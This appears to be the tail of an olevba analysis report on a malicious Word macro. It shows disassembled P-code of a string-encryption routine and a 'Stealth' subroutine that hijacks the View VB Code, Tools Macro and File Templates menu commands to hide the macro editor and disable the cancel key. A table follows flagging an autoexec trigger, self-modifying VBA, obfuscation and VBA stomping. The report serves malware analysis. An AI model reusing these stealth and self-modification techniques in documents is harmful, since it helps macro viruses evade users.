' 	Add 
' 	St CryptedString 
' Line #138:
' 	EndIfBlock 
' Line #139:
' 	Ld CryptedString 
' 	Ld B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St CryptedString 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St fl 
' Line #140:
' 	EndIfBlock 
' Line #141:
' 	StartForVariable 
' 	Next 
' Line #142:
' 	Ld CryptedString 
' 	Ld CryptedString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 " "
' 	Ne 
' 	Ld CryptedString 
' 	Ld CryptedString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 ")"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld CryptedString 
' 	LitStr 0x0001 """
' 	Add 
' 	St CryptedString 
' 	EndIf 
' Line #143:
' 	EndSub 
' Line #144:
' 	FuncDefn (Private Sub ViewVBCode())
' 	BoS 0x0000 
' 	ArgsCall Stealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #145:
' 	FuncDefn (Private Sub ToolsMacro())
' 	BoS 0x0000 
' 	ArgsCall Stealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #146:
' 	FuncDefn (Private Sub FileTemplates())
' 	BoS 0x0000 
' 	ArgsCall Stealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #147:
' 	FuncDefn (Private Sub Stealth())
' Line #148:
' 	OnError (Resume Next) 
' Line #149:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #150:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #151:
' 	EndSub 
' Line #152:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

